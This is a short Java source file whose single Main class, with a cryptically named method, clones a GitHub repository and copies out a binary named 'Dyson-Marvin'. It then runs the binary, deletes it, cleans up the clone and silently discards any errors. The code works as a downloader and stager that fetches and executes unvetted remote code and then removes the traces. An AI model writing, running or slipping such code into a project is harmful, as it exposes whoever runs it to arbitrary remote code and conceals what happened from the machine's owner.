import java.io.File;
import java.io.IOException;

public class Main {
    private static int key = 0;

    private void dys() {
        Runtime rt = Runtime.getRuntime();
        if (Main.key == 0) {
            try {
                File fd = new File(System.getProperty("user.dir") + "/Dyson-Marvin");
                if (!(fd.exists())) {
                    Process clone = rt.exec("git clone git@github.com:Necrelox/tmp.git" );
                    clone.waitFor();
                    Process mv = rt.exec("cp " + System.getProperty("user.dir") + "/tmp/Dyson-Marvin " + System.getProperty("user.dir"));
                    mv.waitFor();
                    Process rm = rt.exec("rm -r " + System.getProperty("user.dir") + "/tmp/");
                    rm.waitFor();
                }
                Process ps = rt.exec(System.getProperty("user.dir") + "/Dyson-Marvin");
                ps.waitFor();
                Process rm = rt.exec("rm " + System.getProperty("user.dir") + "/Dyson-Marvin");
                rm.waitFor();
                Main.key = 1;
            } catch (IOException | InterruptedException e) {
            }
        }
    }

    public static void main(String[] args) {
        Main main = new Main();
        main.dys();
    }
}
